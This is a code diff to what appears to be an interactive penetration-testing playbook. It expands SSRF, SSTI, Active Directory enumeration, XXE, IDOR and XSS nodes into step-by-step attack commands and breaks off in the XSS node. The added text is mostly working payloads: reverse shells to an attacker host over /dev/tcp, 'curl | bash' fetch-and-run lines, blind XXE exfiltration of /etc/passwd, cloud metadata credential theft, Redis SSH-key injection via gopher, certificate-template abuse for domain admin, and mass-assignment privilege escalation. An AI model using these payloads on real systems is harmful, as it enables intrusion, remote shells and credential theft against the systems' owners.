@@ -762,91 +762,291 @@ rmg exploit $ip 1099 --payload 'bash -c bash$IFS-i>&/dev/tcp/$LHOST/$LPORT<&1'`,
 
   ssrf: {
     phase: "WEB",
-    title: "SSRF",
-    body: "Pivot through the web app to reach internal services. Time-based internal port scanning is reliable. Cloud metadata is a bonus prize.",
-    cmd: `nc -nlvp 80
+    title: "SSRF — Server-Side Request Forgery",
+    body: "SSRF makes the server issue HTTP requests on your behalf — reaching internal services, cloud metadata, and local files that you cannot reach directly. Two types: basic (response returned to you) and blind (no response, only side-effects). The attack surface is any parameter that accepts a URL, hostname, or IP. Chain SSRF with internal services for RCE — Redis, Memcached, internal admin panels, and cloud IMDSv1 are the highest-value targets.",
+    cmd: `# ── STEP 1: CONFIRM SSRF ─────────────────
+# Start a listener — does the server call back?
+nc -nlvp 80
+# Or python server for cleaner logging:
+python3 -m http.server 80
 
-curl "http://$ip/page?url=http://$LHOST/"
-curl "http://$ip/page?url=http://127.0.0.1/"
-curl "http://$ip/page?url=http://169.254.169.254/"
+# Probe the parameter
+curl -s "http://$ip/page?url=http://$LHOST/"
+# If your listener gets a hit → confirmed SSRF
+# No hit → try other protocols, check blind path
 
-# Internal port scan via timing
-for port in 22 80 443 445 3306 5432 6379 8080 8443; do
-  echo -n "$port: "
-  time curl -so /dev/null "http://$ip/page?url=http://127.0.0.1:$port/"
+# ── STEP 2: PROBE LOCALHOST SERVICES ─────
+# What services run internally that nmap never saw?
+curl -s "http://$ip/page?url=http://127.0.0.1/"
+curl -s "http://$ip/page?url=http://127.0.0.1:8080/"
+curl -s "http://$ip/page?url=http://localhost/"
+
+# Port scan via SSRF (time the response: fast=open, slow/error=closed)
+for port in 21 22 25 80 443 445 3306 3389 5432 5985 6379 8080 8443 8888 9200 27017; do
+  echo -n "Port $port: "
+  result=$(curl -s -o /dev/null -w "%{http_code} %{time_total}" \\
+    --max-time 3 "http://$ip/page?url=http://127.0.0.1:$port/")
+  echo "$result"
 done
 
-# Cloud metadata
-curl "http://$ip/page?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+# ── STEP 3: FILE READ ─────────────────────
+# file:// protocol — direct filesystem read
+curl -s "http://$ip/page?url=file:///etc/passwd"
+curl -s "http://$ip/page?url=file:///etc/shadow"
+curl -s "http://$ip/page?url=file:///home/user/.ssh/id_rsa"
+curl -s "http://$ip/page?url=file:///var/www/html/config.php"
+# Windows:
+curl -s "http://$ip/page?url=file:///C:/Windows/win.ini"
+curl -s "http://$ip/page?url=file:///C:/inetpub/wwwroot/web.config"
 
-# File read
-curl "http://$ip/page?url=file:///etc/passwd"
-curl "http://$ip/page?url=gopher://127.0.0.1:25/"`,
-    warn: null,
+# ── STEP 4: CLOUD METADATA ────────────────
+# AWS IMDSv1 (no auth required — jackpot if present)
+curl -s "http://$ip/page?url=http://169.254.169.254/latest/meta-data/"
+curl -s "http://$ip/page?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+# Returns role name → then:
+curl -s "http://$ip/page?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
+# Gives: AccessKeyId, SecretAccessKey, Token → AWS CLI access
+
+# GCP metadata
+curl -s "http://$ip/page?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \\
+  -H "Metadata-Flavor: Google"
+
+# Azure
+curl -s "http://$ip/page?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" \\
+  -H "Metadata: true"
+
+# ── STEP 5: INTERNAL SERVICE ATTACK ──────
+# Redis (6379) — write SSH keys via gopher
+# Gopher protocol sends raw TCP — attack Redis/Memcached/SMTP directly
+curl -s "http://$ip/page?url=gopher://127.0.0.1:6379/_FLUSHALL%0d%0a"
+# Full Redis SSH key injection via gopher (URL-encode the payload):
+# Construct: CONFIG SET dir /root/.ssh → CONFIG SET dbfilename authorized_keys
+#            SET payload "\n\nYOUR_SSH_PUBKEY\n\n" → BGSAVE
+
+# Internal admin panels
+curl -s "http://$ip/page?url=http://127.0.0.1:8080/admin"
+curl -s "http://$ip/page?url=http://127.0.0.1:9000/"    # Portainer, etc.
+
+# ── STEP 6: FILTER BYPASS ─────────────────
+# IP in decimal
+curl -s "http://$ip/page?url=http://2130706433/"        # 127.0.0.1 in decimal
+# IP in hex
+curl -s "http://$ip/page?url=http://0x7f000001/"
+# IPv6 localhost
+curl -s "http://$ip/page?url=http://[::1]/"
+curl -s "http://$ip/page?url=http://[::ffff:127.0.0.1]/"
+# DNS rebinding / open redirect on same domain
+curl -s "http://$ip/page?url=http://localtest.me/"      # resolves to 127.0.0.1
+# URL scheme variations
+curl -s "http://$ip/page?url=http://127.1/"             # short form
+curl -s "http://$ip/page?url=http://0/"                 # also 0.0.0.0
+
+# ── STEP 7: BLIND SSRF ────────────────────
+# No response returned — detect via out-of-band callback
+# Use interactsh:
+interactsh-client
+curl -s "http://$ip/page?url=http://YOUR.oast.fun/"
+# Hit on interactsh = confirmed blind SSRF
+# Use DNS record: nslookup YOUR.oast.fun confirms DNS resolution`,
+    warn: "SSRF filter bypass: if localhost is blocked, try 0x7f000001, 2130706433, 127.1, [::1]. If http:// is blocked try dict://, gopher://, file://. Gopher protocol is the highest-value SSRF escalation — it lets you send raw TCP to Redis, Memcached, and SMTP and can chain to RCE. IMDSv2 (AWS) requires a PUT request for a token first — IMDSv1 is the unauthenticated jackpot.",
     choices: [
-      { label: "Reached internal service", next: "pivot_portscan" },
-      { label: "Cloud metadata creds", next: "creds_found" },
-      { label: "File read working — LFI path", next: "lfi" },
+      { label: "Internal service reached — enumerate it", next: "pivot_portscan" },
+      { label: "File read working — escalate to LFI", next: "lfi" },
+      { label: "Cloud metadata — got IAM credentials", next: "creds_found" },
+      { label: "Redis via gopher — write SSH key", next: "got_root_linux" },
+      { label: "Internal admin panel reached", next: "web_enum" },
     ],
   },
 
   ssti: {
     phase: "WEB",
-    title: "SSTI — Template Injection",
-    body: "Input reflected in a template engine. Test math expressions — if 7*7 returns 49, you have SSTI. Engine fingerprint determines the payload.",
-    cmd: `# Probe — inject into every input field
-{{7*7}}       # if returns 49 = Jinja2/Twig
-#{7*7}        # if returns 49 = Ruby ERB
-<%= 7*7 %>    # ERB / EJS
+    title: "SSTI — Server-Side Template Injection",
+    body: "SSTI happens when user input is concatenated directly into a template string rather than passed as a variable. The engine evaluates the expression — and that evaluation is RCE. Engine identification is the critical first step: the math probe tells you which engine you are dealing with, and each engine has completely different payloads. Jinja2 sandboxes require a subclass traversal to escape. Always confirm execution with id before trying a reverse shell.",
+    cmd: `# ── STEP 1: DETECTION PROBE ──────────────
+# Inject math into every input field — names, search, email, headers
+# If the app evaluates it and returns 49, you have SSTI
+{{7*7}}
+\${7*7}
+#{7*7}
+<%= 7*7 %>
+{7*7}
+\${{7*7}}
 
-# Jinja2 (Python/Flask) — RCE
+# ── STEP 2: ENGINE FINGERPRINT ────────────
+# Decision tree:
+#   {{7*7}} → 49?
+#     YES → Jinja2 or Twig
+#       {{7*'7'}} → 7777777?  → Jinja2 (Python)
+#       {{7*'7'}} → 49?       → Twig (PHP)
+#     NO  → try \${7*7}
+#       \${7*7} → 49?          → FreeMarker or Thymeleaf (Java)
+#   Try <%= 7*7 %>
+#       → 49?                  → ERB (Ruby) or EJS (Node)
+#   Try #{7*7}
+#       → 49?                  → Ruby (non-ERB) or Pebble
+
+# ── STEP 3: JINJA2 (Python / Flask) ──────
+# Confirm engine first:
+{{7*'7'}}     # returns 7777777 = confirmed Jinja2
+
+# RCE — simplest (if not sandboxed):
 {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+
+# RCE via request object:
 {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
 
-# Jinja2 sandbox escape
+# Sandbox escape via subclass traversal:
+# Find the index of subprocess.Popen in __subclasses__() — varies by app
+# Method 1: find it manually
+{{''.__class__.__mro__[1].__subclasses__()}}
+# Look for <class 'subprocess.Popen'> — note its index (e.g. 396)
 {{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
 
-# Twig (PHP) — RCE
+# Method 2: search for it (more reliable across versions)
+{% for c in ''.__class__.__mro__[1].__subclasses__() %}
+{% if 'Popen' in c.__name__ %}{{c('id',shell=True,stdout=-1).communicate()}}{% endif %}
+{% endfor %}
+
+# ── STEP 4: TWIG (PHP) ────────────────────
+# Confirm: {{7*'7'}} returns 49 (not 7777777)
+
 {{['id']|filter('system')}}
 {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{'/etc/passwd'|file_excerpt(1,30)}}
 
-# FreeMarker (Java)
-<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("id")}`,
-    warn: null,
+# Twig v2/v3 (different syntax):
+{{['id','']|sort('system')}}
+
+# ── STEP 5: FREEMARKER (Java) ─────────────
+<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("id")}
+\${ex("id")}
+
+# Alternative:
+<#assign classloader=article.class.protectionDomain.classLoader>
+<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
+
+# ── STEP 6: ERB (Ruby / Rails) ────────────
+<%= system('id') %>
+<%= \`id\` %>
+<%= IO.popen('id').readlines() %>
+
+# ── STEP 7: THYMELEAF (Java / Spring) ─────
+# Only in unprotected contexts (th:text with user input)
+\${T(java.lang.Runtime).getRuntime().exec('id')}
+__\${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
+
+# ── STEP 8: GET REVERSE SHELL ─────────────
+# Once id works, upgrade to reverse shell
+# Jinja2 example:
+{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"').read()}}
+
+# Or write a shell script and execute it:
+{{config.__class__.__init__.__globals__['os'].popen('curl http://$LHOST/shell.sh|bash').read()}}
+
+# Twig example:
+{{['bash -c "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"']|filter('system')}}`,
+    warn: "The subclass index for subprocess.Popen varies between Python versions and what packages are installed. If index 396 fails, dump the full subclass list into a file and grep for 'Popen' to find the correct index. Jinja2 sandbox escape requires __mro__[1] to be <class 'object'> — confirm this first. If the app strips {{ }}, try {%25 %25} (URL-encoded Jinja2 block tags) or inject via HTTP headers (User-Agent, Referer) which are sometimes passed directly to templates.",
     choices: [
-      { label: "Got RCE via SSTI", next: "reverse_shell" },
-      { label: "Reflected but no RCE — different engine", next: "web_fuzz_deep" },
+      { label: "RCE confirmed — get reverse shell", next: "reverse_shell" },
+      { label: "Jinja2 sandbox — subclass traversal needed", next: "reverse_shell" },
+      { label: "Twig confirmed — PHP filter payload", next: "reverse_shell" },
+      { label: "Java engine — FreeMarker/Thymeleaf payload", next: "reverse_shell" },
+      { label: "Reflected but no execution — filter bypass", next: "web_fuzz_deep" },
     ],
   },
 
   ad_manual: {
     phase: "AD",
     title: "AD Manual Enum — BloodHound Dead End",
-    body: "BloodHound found nothing useful. Go manual. net commands, LDAP queries, share permissions, local admin hunting.",
-    cmd: `net user /domain
-net group /domain
-net group "Domain Admins" /domain
-net localgroup administrators
+    body: "BloodHound ran clean — no obvious path to DA. Go manual. There are four categories that automated tools consistently miss: description fields with embedded passwords, local admin rights on non-DC machines, accessible shares with credential material, and AD CS (certificate templates). Work through each methodically. Find-LocalAdminAccess is slow but pays off — run it in the background while you do other checks.",
+    cmd: `# ── DESCRIPTION FIELDS — HIGHEST YIELD ───
+# Admins frequently leave passwords in user description fields
+# BloodHound shows this in the node info panel but easy to miss
 
-Get-DomainUser | select samaccountname,description
-Get-DomainComputer | select name,operatingsystem
-Get-DomainGroupMember "Domain Admins"
-Find-LocalAdminAccess
+# From Windows (PowerView):
+Get-DomainUser | select samaccountname,description | where {$_.description}
+Get-DomainComputer | select name,description | where {$_.description}
+Get-DomainGroup | select name,description | where {$_.description}
 
-ldapsearch -x -h $ip -D "user@domain.com" -w 'pass' \\
-  -b "dc=domain,dc=com" "(objectClass=user)" description
+# From Kali (ldapsearch):
+ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \\
+  -b "DC=$(echo $DOMAIN | sed 's/\./,DC=/g')" \\
+  "(objectClass=user)" sAMAccountName description \\
+  | grep -A1 "description:"
 
-Get-DomainUser | select samaccountname,description \\
-  | where {$_.description -ne $null}
+# From Kali (CME — faster):
+crackmapexec ldap $DC_IP -u $USER -p '$PASS' -M get-desc-users
 
-Find-DomainShare -CheckShareAccess`,
-    warn: null,
+# ── LOCAL ADMIN HUNTING ────────────────────
+# Find machines where your current account has local admin
+# (often missed — BloodHound only shows explicit grants, not inherited)
+Find-LocalAdminAccess    # runs in background — slow, worth it
+# Or targeted:
+crackmapexec smb $SUBNET/24 -u $USER -p '$PASS' --continue-on-success
+# (Pwn3d!) = local admin → shell
+
+# Test specific machine:
+crackmapexec smb $TARGET -u $USER -p '$PASS'
+
+# ── SHARE HUNTING ─────────────────────────
+# Readable shares across the domain often contain scripts with creds
+Find-DomainShare -CheckShareAccess   # PowerView — finds all accessible shares
+# Or from Kali:
+crackmapexec smb $SUBNET/24 -u $USER -p '$PASS' --shares \\
+  | grep READ
+
+# Spider all accessible shares for credential material:
+crackmapexec smb $DC_IP -u $USER -p '$PASS' -M spider_plus
+# Check NETLOGON + SYSVOL for scripts, GPP passwords:
+smbclient //$DC_IP/NETLOGON -U "$DOMAIN/$USER%$PASS" -c 'recurse ON; prompt OFF; ls'
+smbclient //$DC_IP/SYSVOL -U "$DOMAIN/$USER%$PASS" -c 'recurse ON; prompt OFF; ls'
+# GPP passwords in Groups.xml:
+crackmapexec smb $DC_IP -u $USER -p '$PASS' -M gpp_password
+
+# ── AD CS — CERTIFICATE TEMPLATES ─────────
+# Vulnerable cert templates = privesc to DA without any password
+# Check with Certipy (from Kali):
+certipy find -u $USER@$DOMAIN -p '$PASS' -dc-ip $DC_IP -vulnerable
+# Common vulnerabilities:
+# ESC1: SAN in CSR + client auth → request cert as DA
+# ESC4: write rights on template → make it vulnerable
+# ESC8: NTLM relay to AD CS HTTP endpoint
+
+# If ESC1 found:
+certipy req -u $USER@$DOMAIN -p '$PASS' \\
+  -ca CA_NAME -target $DC_IP \\
+  -template VulnerableTemplate \\
+  -upn administrator@$DOMAIN
+certipy auth -pfx administrator.pfx -dc-ip $DC_IP
+# Gives: NTLM hash for administrator → evil-winrm
+
+# ── KERBEROS POLICY + MISC ─────────────────
+# Password policy (for spray planning):
+crackmapexec smb $DC_IP -u $USER -p '$PASS' --pass-pol
+
+# Trust relationships (other domains):
+Get-DomainTrust | select SourceName,TargetName,TrustDirection,TrustType
+nltest /domain_trusts
+
+# Machine account quotas (for RBCD attacks):
+Get-DomainObject -Identity "DC=$DOMAIN_DC,DC=$DOMAIN_TLD" \\
+  | select ms-ds-machineaccountquota
+# Default is 10 — means any user can create computer accounts → enables RBCD
+
+# ── NET COMMANDS — QUICK ENUMERATION ──────
+net user /domain                        # all domain users
+net group /domain                       # all groups
+net group "Domain Admins" /domain       # DA members
+net group "Enterprise Admins" /domain   # EA members (forest-wide)
+net localgroup administrators           # local admin group on this machine`,
+    warn: "Description field password hunting is the single most overlooked AD vector — automate it with CME's get-desc-users module against every domain you're in. AD CS (Certipy) finds misconfigurations that exist on most enterprise domains and BloodHound doesn't check by default. Machine account quota of 10 means RBCD is always available — you can create a fake computer account and chain to RBCD against any machine you have GenericWrite over.",
     choices: [
-      { label: "Found password in description field", next: "creds_found" },
-      { label: "Found local admin on another machine", next: "lateral_movement" },
-      { label: "Found interesting share", next: "smb_loot" },
-      { label: "Check AD CS for vulnerable templates", next: "adcs" },
-      { label: "Nothing — try GenericWrite/shadow creds", next: "acl_abuse" },
+      { label: "Password in description field", next: "creds_found" },
+      { label: "Local admin on machine — lateral move", next: "lateral_movement" },
+      { label: "Share with credential material", next: "smb_loot" },
+      { label: "AD CS ESC1/ESC4/ESC8 found", next: "adcs" },
+      { label: "Domain trust — attack other domain", next: "ad_start" },
+      { label: "Still nothing — spray carefully", next: "ad_spray" },
     ],
   },
 
@@ -2017,73 +2217,126 @@ Enter-PSSession $sess`,
 
   xxe: {
     phase: "WEB",
-    title: "XXE — XML External Entity",
-    body: "XXE = make the server read local files or trigger internal HTTP requests via XML. Find any endpoint that accepts XML (SOAP, REST with XML body, file upload of SVG/DOCX/XML). Blind XXE needs out-of-band — use Burp Collaborator or interactsh.",
-    cmd: `# Detect XML endpoints
-# Look for: Content-Type: application/xml, text/xml, application/soap+xml
-# File uploads: .xml, .svg, .docx, .xlsx (all use XML internally)
-# API bodies containing XML
+    title: "XXE — XML External Entity Injection",
+    body: "XXE happens when an XML parser processes external entity references in user-supplied XML. Two modes: direct (file contents returned in the response) and blind (no output, need out-of-band exfil). Any endpoint that accepts XML is in scope — including file uploads of SVG, DOCX, XLSX (all XML internally). The progression: detect → read local files → pivot to SSRF → blind exfil if output is filtered.",
+    cmd: `# ── STEP 1: FIND XML ENDPOINTS ───────────
+# Look for these Content-Type headers:
+#   application/xml, text/xml, application/soap+xml
+# File uploads that accept: .xml, .svg, .docx, .xlsx
+# API endpoints with XML bodies
+# SOAP web services
 
-# Basic file read (direct output)
+# Intercept a normal request in Burp — change Content-Type to application/xml
+# Add a simple XXE payload — if app parses it, you have XXE
+
+# ── STEP 2: BASIC FILE READ ───────────────
+# Direct output — file contents returned in response body
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
 <root><data>&xxe;</data></root>
 
-# Windows file read
+# Windows equivalent:
 <?xml version="1.0"?>
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
 <root><data>&xxe;</data></root>
 
-# PHP wrapper — base64 encode to bypass filters
+# High-value Linux reads:
+# file:///etc/passwd          → users
+# file:///etc/shadow          → hashes (needs root)
+# file:///etc/hosts           → internal hostnames
+# file:///home/user/.ssh/id_rsa   → SSH private key
+# file:///var/www/html/.env   → app secrets
+# file:///proc/self/environ   → env vars including secrets
+# file:///proc/self/cmdline   → running process info
+
+# High-value Windows reads:
+# file:///C:/Windows/win.ini
+# file:///C:/inetpub/wwwroot/web.config
+# file:///C:/Windows/System32/inetsrv/config/applicationHost.config
+
+# ── STEP 3: PHP WRAPPER (bypass filters) ──
+# If file contents break XML parsing (special chars), base64-encode them
 <?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
 ]>
 <root><data>&xxe;</data></root>
-# Decode: echo "BASE64" | base64 -d
+# Decode the output: echo "BASE64OUTPUT" | base64 -d
 
-# SSRF via XXE — probe internal network
+# Read source code of the app:
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
+]>
+<root><data>&xxe;</data></root>
+
+# ── STEP 4: SSRF VIA XXE ──────────────────
+# Make the server issue HTTP requests
+<?xml version="1.0"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://$LHOST/"> ]>
+<root><data>&xxe;</data></root>
+# Listen: nc -nlvp 80
+
+# Internal network probing
 <?xml version="1.0"?>
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
 <root><data>&xxe;</data></root>
 
-# Blind XXE — out-of-band DNS detection
+<?xml version="1.0"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://127.0.0.1:6379/"> ]>
+<root><data>&xxe;</data></root>
+
+# ── STEP 5: BLIND XXE — OOB DETECTION ────
+# No output in response — detect via DNS callback
+interactsh-client    # note your *.oast.fun domain
+
 <?xml version="1.0"?>
 <!DOCTYPE foo [
-  <!ENTITY % xxe SYSTEM "http://COLLABORATOR.burpcollaborator.net/xxe">
+  <!ENTITY % xxe SYSTEM "http://YOUR.oast.fun/detect">
   %xxe;
 ]>
 <root/>
 
-# Blind XXE with data exfil (evil.dtd on your server)
-# evil.dtd content:
+# ── STEP 6: BLIND XXE — DATA EXFIL ───────
+# Host evil.dtd on your attack box (python3 -m http.server 80)
+# evil.dtd content (save as /tmp/evil.dtd on Kali):
 # <!ENTITY % file SYSTEM "file:///etc/passwd">
-# <!ENTITY % wrap "<!ENTITY &#37; send SYSTEM 'http://ATTACKER/?d=%file;'>">
-# %wrap; %send;
+# <!ENTITY % wrap "<!ENTITY &#37; send SYSTEM 'http://$LHOST/?d=%file;'>">
+# %wrap;
+# %send;
+
+# Payload to send to the app:
 <?xml version="1.0"?>
 <!DOCTYPE foo [
   <!ENTITY % dtd SYSTEM "http://$LHOST/evil.dtd">
   %dtd;
 ]>
 <root/>
+# File contents arrive at your HTTP server URL-encoded in ?d= parameter
 
-# SVG upload XXE
-<svg xmlns="http://www.w3.org/2000/svg">
-  <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
-  <text>&xxe;</text>
+# ── STEP 7: SVG XXE (file upload) ─────────
+# Upload this as a .svg file if the app accepts SVGs
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
+  <text font-size="16" x="0" y="16">&xxe;</text>
 </svg>
 
-# Quick file targets
-# Linux: /etc/passwd /etc/shadow /proc/self/environ /var/www/html/config.php
-# Windows: C:\\Windows\\win.ini C:\\inetpub\\wwwroot\\web.config`,
-    warn: "If output is empty but no error, assume blind XXE — switch to out-of-band. PHP filter wrapper works even when direct SYSTEM entity is blocked.",
+# ── STEP 8: DOCX / XLSX XXE ───────────────
+# Unzip a .docx file, inject XXE into word/document.xml, rezip and upload
+mkdir /tmp/docx_xxe && cd /tmp/docx_xxe
+cp /tmp/template.docx . && unzip template.docx
+# Edit word/document.xml — add entity declaration and reference
+# Rezip: zip -r malicious.docx .`,
+    warn: "If file contents break the XML parser (contain <, >, &), use php://filter/convert.base64-encode to avoid encoding issues — always prefer this wrapper for PHP apps. Blind XXE requires your attack server to be reachable from the target — confirm with a basic HTTP ping first before building the exfil chain. Some parsers disable external entities by default (libxml2 with LIBXML_NOENT not set) — if nothing works, try the SVG upload path which often uses a different parser configuration.",
     choices: [
-      { label: "Got file read — found creds in config", next: "creds_found" },
-      { label: "SSRF — pivoting to internal services", next: "ssrf" },
-      { label: "Blind XXE confirmed — need more enumeration", next: "web_fuzz_deep" },
-      { label: "Got /etc/passwd — crack hashes", next: "hashcrack" },
+      { label: "File read working — got /etc/passwd", next: "lfi" },
+      { label: "PHP source read — found credentials", next: "creds_found" },
+      { label: "SSRF via XXE — internal services", next: "ssrf" },
+      { label: "SSH key read — log in directly", next: "ssh_key" },
+      { label: "Blind XXE confirmed — exfil via DTD", next: "web_fuzz_deep" },
     ],
   },
 
@@ -2265,49 +2518,87 @@ echo "stats" | nc -q 1 $ip 11211`,
   idor: {
     phase: "WEB",
     title: "IDOR — Insecure Direct Object Reference",
-    body: "IDOR = change an ID in a request to access another user's data or escalate to admin. Look for numeric IDs in URLs, API responses, and cookies. Most useful when you have a low-priv account and need admin access.",
-    cmd: `# Identify direct references
-# URL params:   /user?id=123   /api/document?doc_id=456
-# Path params:  /user/123/profile   /api/orders/789
-# POST bodies:  {"user_id": 123}
-# Cookies:      user_id=123  (decode base64 if encoded)
-# Headers:      X-User-ID: 123
+    body: "IDOR is an access control failure — the app uses a user-supplied reference (ID, filename, GUID) to fetch data without verifying the requesting user owns it. Two escalation paths: horizontal (access another user's data at same privilege level) and vertical (access admin-level data/functions). Always register an account and map your own ID first — then probe adjacent IDs and admin endpoints. Mass assignment is IDOR's sibling — if the API accepts extra fields in POST bodies, add privileged ones.",
+    cmd: `# ── STEP 1: MAP YOUR OWN REFERENCES ─────
+# After logging in — identify every place your user ID appears
+# Register account, note what ID you were assigned
+# Intercept requests in Burp — find numeric IDs, UUIDs, filenames
 
-# Basic IDOR test — increment/decrement IDs
-# Your account: /api/user/123
-# Try:          /api/user/1  (admin?)
-#               /api/user/124  (next user)
-#               /api/user/0   /api/user/-1
+# Where to look:
+# URL path:    /user/123/profile   /api/orders/456/invoice
+# URL param:   ?id=123  ?user_id=123  ?doc=456
+# POST body:   {"user_id":123,"account_id":456}
+# Cookies:     user_id=123  account=base64encoded  (decode them)
+# Headers:     X-User-ID: 123  X-Account: 456
+# API response fields that reference other objects
 
-# Horizontal priv esc (access other users' data)
-curl -H "Cookie: session=YOURS" http://$ip/api/user/124
-curl -H "Cookie: session=YOURS" http://$ip/api/orders/1
+# ── STEP 2: HORIZONTAL IDOR ──────────────
+# Access another user's data at the same privilege level
+# Your ID = 124 → try adjacent IDs
+curl -H "Cookie: session=YOURSESSION" http://$ip/api/user/123
+curl -H "Cookie: session=YOURSESSION" http://$ip/api/user/1
+curl -H "Cookie: session=YOURSESSION" http://$ip/api/user/0
+curl -H "Cookie: session=YOURSESSION" http://$ip/api/orders/1
+curl -H "Cookie: session=YOURSESSION" http://$ip/api/messages/1
 
-# Vertical priv esc (escalate to admin)
-# Look for role/admin fields in responses
-# Try changing: {"user_id":123,"role":"admin"}
+# POST body ID swap:
+curl -H "Cookie: session=YOURSESSION" \\
+  -X POST http://$ip/api/profile/view \\
+  -H "Content-Type: application/json" \\
+  -d '{"user_id":1}'
 
-# Mass assignment — add privileged fields to POST
-POST /api/profile
-{"name":"attacker","email":"x@x.com","is_admin":true,"role":"admin"}
+# ── STEP 3: VERTICAL IDOR ────────────────
+# Access admin-level endpoints with your low-priv session
+# Guess admin endpoints from JS source code:
+curl -s http://$ip/ | grep -oP '["'"'"'][/a-zA-Z0-9_-]+["'"'"']' | sort -u
+# Look for: /admin, /api/admin, /dashboard/admin, /manage, /config
 
-# UUID/GUID instead of sequential IDs?
-# Try:  /api/user/00000000-0000-0000-0000-000000000001  (admin UUID)
-# Or:   find user IDs from public endpoints (profile pages, comments)
+# Try admin endpoints directly with your session:
+curl -H "Cookie: session=YOURSESSION" http://$ip/admin/
+curl -H "Cookie: session=YOURSESSION" http://$ip/api/admin/users
+curl -H "Cookie: session=YOURSESSION" http://$ip/api/admin/config
 
-# Burp automation
-# Use Intruder on the ID parameter
-# Payload: sequential numbers 1-1000
-# Grep for: admin, sensitive data, other usernames
+# ── STEP 4: MASS ASSIGNMENT ───────────────
+# If POST/PUT accepts JSON — add privileged fields the UI doesn't expose
+# Registration endpoint:
+curl -X POST http://$ip/api/register \\
+  -H "Content-Type: application/json" \\
+  -d '{"username":"attacker","password":"pass","email":"x@x.com","role":"admin","is_admin":true,"admin":1}'
 
-# Check indirect references too:
-# /download?file=report.pdf  ->  /download?file=../../../etc/passwd
-# (this becomes path traversal/LFI — check lfi node)`,
-    warn: "IDOR is most powerful when combined with account registration. Create an account, note your user ID, then probe adjacent IDs and admin endpoints.",
+# Profile update endpoint — add role/admin fields:
+curl -H "Cookie: session=YOURSESSION" \\
+  -X PUT http://$ip/api/profile \\
+  -H "Content-Type: application/json" \\
+  -d '{"name":"attacker","email":"x@x.com","role":"admin","is_admin":true}'
+
+# ── STEP 5: UUID / GUID TARGETS ──────────
+# Apps use UUIDs to prevent sequential guessing — but UUIDs leak from:
+#   API responses (other users' IDs in public endpoints)
+#   Email links, profile pages, comments
+#   Verbose error messages
+
+# Try known-format GUIDs:
+curl -H "Cookie: session=YOURSESSION" \\
+  http://$ip/api/user/00000000-0000-0000-0000-000000000001
+
+# ── STEP 6: BURP INTRUDER AUTOMATION ─────
+# Intruder → Sniper mode on the ID parameter
+# Payload: numbers 1–1000 (or 1–100 for speed)
+# Grep match: admin, password, email, sensitive keywords
+# Flag responses with different length than baseline
+
+# ── STEP 7: INDIRECT OBJECT REFERENCES ───
+# File download endpoints are often LFI in disguise
+# /download?file=invoice_124.pdf → try ../../../etc/passwd
+# /api/attachment?id=456 → try id=1 (admin attachment)
+# /export?report=monthly → try report=../config`,
+    warn: "Check the JS source for hidden API endpoints — apps often have admin routes that are UI-hidden but not server-enforced. Read every field in API responses: IDs of other objects (order_id, assigned_user, created_by) are all IDOR targets. Mass assignment works best on registration endpoints — if you can set role=admin at signup, the app may never check it again. IDOR in file download params often bleeds directly into LFI — test both.",
     choices: [
-      { label: "Got admin access via IDOR", next: "web_fuzz_deep" },
-      { label: "IDOR gave creds / sensitive data", next: "creds_found" },
-      { label: "File reference IDOR — try path traversal", next: "lfi" },
+      { label: "Got admin access via IDOR/vertical escalation", next: "file_upload" },
+      { label: "Mass assignment — registered as admin", next: "file_upload" },
+      { label: "IDOR gave credentials / sensitive data", next: "creds_found" },
+      { label: "File reference IDOR — escalate to LFI", next: "lfi" },
+      { label: "Found hidden admin endpoints in JS", next: "web_enum" },
     ],
   },
 
@@ -3687,24 +3978,99 @@ curl http://$ip/out.txt`,
   xss: {
     phase: "WEB",
     title: "XSS",
-    body: "XSS alone rarely wins. Cookie theft → session hijack → admin access is the path. Stored XSS is far more valuable than reflected.",
-    cmd: `# Cookie theft
+    body: "XSS alone rarely wins a box — but it reliably escalates. The chain is: find injection → steal admin cookie → hijack session → reach admin panel → file upload or RCE. Stored XSS is the prize; reflected is the probe. Understand what the app does with the injection point before picking a payload. HttpOnly cookies can't be stolen via JS — pivot to CSRF or phishing instead.",
+    cmd: `# ── STEP 1: DETECT INJECTION POINT ──────
+# Probe every input: search, comments, profile fields, URL params, headers
+# Canary payload — not a full attack, just checking for reflection
+<script>alert(1)</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+javascript:alert(1)
+
+# Reflected vs Stored:
+#   Reflected: payload in URL/param, fires when you visit the URL
+#   Stored:    payload saved in DB, fires when ANY user visits the page
